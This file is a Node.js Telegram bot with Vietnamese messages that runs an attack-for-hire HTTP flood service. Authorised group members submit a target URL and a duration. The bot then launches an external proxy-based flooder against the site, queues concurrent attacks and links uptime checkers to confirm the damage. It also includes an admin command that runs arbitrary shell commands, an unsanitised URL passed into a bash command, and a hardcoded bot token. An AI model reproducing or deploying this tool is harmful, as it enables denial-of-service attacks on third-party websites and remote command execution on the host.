const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxTime = 120;
const maxConcurrent = 3;

const bot = new TelegramBot(token, { polling: true });
const processes = { users: new Map(), attacks: new Map(), queue: [] };

// ==================== CORE FUNCTIONS ====================
const sendMsg = (chatId, text, buttons) => {
  const options = { parse_mode: 'HTML', ...(buttons && { reply_markup: { inline_keyboard: buttons } }) };
  bot.sendMessage(chatId, text, options);
};

const cleanup = (pid, uid) => {
  processes.attacks.delete(pid);
  processes.users.delete(uid);
  processQueue();
};

const processQueue = () => {
  if (processes.queue.length === 0 || processes.attacks.size >= maxConcurrent) return;
  const { chatId, host, time, user, uid } = processes.queue.shift();
  execute(chatId, host, time, user, uid);
};

const execute = (chatId, host, time, user, uid) => {
  const pid = Date.now() % 1e6;
  const startTime = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

  const message = JSON.stringify({
    Status: "🚀 Successfully 🚀",
    Caller: user,
    "PID Attack": pid,
    Website: host,
    Time: `${time} Giây`,
    Maxslot: 1,
    ConcurrentAttacks: processes.attacks.size + 1,
    StartTime: startTime,
    CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
    HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
  }, null, 2);

  const buttons = [
    [{ text: '🔍 Check Host', url: `https://check-host.net/check-http?host=${host}` }],
    [{ text: '📡 Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
  ];

  sendMsg(chatId, `<pre>${message}</pre>`, buttons);

  const child = exec(`node ./negan -m GET -u "${host}" -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
  processes.attacks.set(pid, { uid, start: Date.now() });
  processes.users.set(uid, { pid, start: Date.now(), time });

  child
    .on('error', e => sendMsg(chatId, `❌ Lỗi hệ thống: <code>${e.message}</code>`))
    .on('exit', () => {
      sendMsg(chatId, `🛸 END ATTACK\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time}s\nCaller: @${user}\nEnd Attack: ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`);
      cleanup(pid, uid);
    });
};

// ==================== BOT HANDLERS ====================
bot.on('message', msg => {
  const { chat: { id: cid }, text, from: { id: uid, username: user = 'Unknown' } = {} } = msg;
  const [isAdmin, isGroup] = [uid === adminId, allowedGroupIds.has(cid)];

  if (!isAdmin && !isGroup) return sendMsg(cid, '🚫 Bạn không có quyền sử dụng bot này!');
  if (!text) return;

  // Xử lý lệnh tấn công
  if (/^https?:\/\//.test(text)) {
    const [host, time] = text.split(/\s+/);
    const t = parseInt(time);
    if (!host || isNaN(t)) return sendMsg(cid, '⚠️ Sai cú pháp! Ví dụ: https://example.com 60');
    if (t > maxTime) return sendMsg(cid, `⏳ Tối đa ${maxTime} giây!`);

    if (processes.users.has(uid)) return sendMsg(cid, '⛔ Bạn đang có một tiến trình chạy, vui lòng đợi!');

    if (processes.attacks.size >= maxConcurrent) {
      processes.queue.push({ chatId: cid, host, time: t, user, uid });
      sendMsg(cid, '📥 Lệnh đã được thêm vào hàng đợi!');
    } else {
      execute(cid, host, t, user, uid);
    }
    return;
  }

  // Xử lý lệnh admin
  if (text.startsWith('exe ') && isAdmin) {
    const cmd = text.slice(4).trim();
    if (!cmd) return sendMsg(cid, '⚠️ Vui lòng nhập lệnh!');

    exec(cmd, (err, stdout, stderr) => {
      const result = err ? `❌ Lỗi:\n<code>${err.message}</code>` : stderr ? `⚠️ Cảnh báo:\n<code>${stderr}</code>` : `✅ Kết quả:\n<code>${stdout || 'Không có output'}</code>`;
      sendMsg(cid, result);
    });
    return;
  }

  sendMsg(cid, '❌ Lệnh không hợp lệ! Gửi URL + thời gian để bắt đầu hoặc dùng lệnh exe (admin)');
});

// Khởi động bot
bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
